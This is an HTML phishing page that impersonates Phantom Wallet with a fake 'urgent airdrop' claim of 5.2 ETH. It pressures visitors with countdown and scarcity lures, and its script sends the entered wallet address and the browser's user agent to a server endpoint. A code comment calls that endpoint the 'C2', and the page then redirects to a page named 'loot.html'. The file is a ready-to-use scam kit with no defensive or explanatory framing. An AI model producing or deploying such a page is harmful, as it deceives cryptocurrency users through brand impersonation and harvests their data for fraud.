<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Phantom Wallet - Urgent Airdrop Claim</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: white; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); padding: 40px; max-width: 450px; text-align: center; }
        .logo { width: 80px; height: 80px; background: #f0f0f0; border-radius: 20px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 30px; font-weight: bold; color: #6366f1; }
        h1 { color: #1f2937; margin-bottom: 10px; font-size: 28px; }
        .subtitle { color: #6b7280; margin-bottom: 30px; }
        .claim-btn { background: linear-gradient(135deg, #10b981, #059669); color: white; border: none; padding: 15px 40px; border-radius: 50px; font-size: 18px; font-weight: 600; cursor: pointer; width: 100%; margin-bottom: 20px; transition: transform 0.2s; }
        .claim-btn:hover { transform: scale(1.05); }
        .wallet-input { width: 100%; padding: 15px; border: 2px solid #e5e7eb; border-radius: 12px; font-size: 16px; margin-bottom: 20px; text-align: center; }
        .urgency { color: #ef4444; font-weight: 600; margin-top: 10px; }
        .footer { margin-top: 30px; font-size: 12px; color: #9ca3af; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">üöÄ</div>
        <h1>Phantom Airdrop Alert!</h1>
        <p class="subtitle">Claim your 5.2 ETH instantly. Limited to first 500 wallets.</p>
        <input type="text" id="wallet" class="wallet-input" placeholder="Enter your Phantom wallet address..." maxlength="66">
        <button class="claim-btn" onclick="claimAirdrop()">üöÄ CLAIM AIRDROP</button>
        <div id="status" class="urgency" style="display:none;"></div>
        <div class="footer">Official Phantom Wallet Security Update - Ends in 2h</div>
    </div>
    
    <script>
        function claimAirdrop() {
            const wallet = document.getElementById('wallet').value;
            const status = document.getElementById('status');
            
            if (!wallet || !wallet.match(/^0x[a-fA-F0-9]{40}$/)) {
                status.textContent = '‚ùå Invalid wallet address';
                status.style.display = 'block';
                return;
            }
            
            status.textContent = 'üîÑ Connecting to Phantom...';
            status.style.color = '#f59e0b';
            status.style.display = 'block';
            
            // Send to your C2
            fetch('/phantom_airdrop.py', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({wallet: wallet, ip: '', ua: navigator.userAgent, timestamp: Date.now()})
            })
            .then(() => {
                status.textContent = '‚úÖ Airdrop claimed! Check Phantom wallet in 30s';
                status.style.color = '#10b981';
                setTimeout(() => window.location.href = '/loot.html', 2000);
            })
            .catch(() => {
                status.textContent = '‚ùå Connection failed. Try again.';
                status.style.color = '#ef4444';
            });
        }
        
        // Auto-focus input
        document.getElementById('wallet').focus();
    </script>
</body>
</html>
